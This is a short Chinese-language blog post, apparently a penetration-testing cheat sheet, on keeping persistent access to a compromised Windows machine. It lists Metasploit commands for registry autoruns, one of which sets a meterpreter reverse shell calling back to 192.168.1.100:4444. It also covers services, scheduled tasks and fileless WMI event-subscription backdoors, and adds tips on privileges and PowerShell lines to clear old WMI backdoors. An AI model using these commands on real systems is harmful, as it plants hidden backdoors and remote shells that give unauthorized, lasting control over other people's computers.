---
title: "Windows 单机权限维持"
date: 2019-07-22T00:00:00+08:00
draft: false
tags: ['windows']
categories: ['内网渗透']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

Windows 单机权限维持

<!--more-->

## 注册表

上传 vbs 开机自启 (被弃用).

```
run persistence -r 192.168.1.100 -p 4444 -i 5 -P windows/x64/meterpreter/reverse_tcp -X
```

上传 exe 开机自启 (替代 vbs 方式).

```
run post/windows/manage/persistence_exe REXEPATH=/home/exp10it/msf.exe
```

添加 powershell 开机自启.

```
use exploit/windows/local/registry_persistence
```

可指定 `STARTUP`, 但注意要在会话是 Administrator 权限的时候运行, System 权限需先降权, 否则无效.

## 服务

仅支持 x86 payload, 可通过 `exploit/windows/local/payload_inject` 反弹成 64 位的会话.

```
use exploit/windows/local/persistence_service
```

## 计划任务

上传 exe 执行, 需要 system 权限.
```
run scheduleme -e /home/exp10it/msf.exe -H 12
```

中途会出现 ` Failed to create scheduled task!!`, 但实际上已经添加成功.

## WMI

通过 powershell 方式执行, 无文件后门, 支持 5 种触发方式.

```
use exploit/windows/local/wmi_persistence
```

注意切换触发方式时要先清除以前的后门.

```
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='Updater'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='Updater'" | Remove-WmiObject -Verbose
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'" | Remove-WmiObject -Verbose
``` 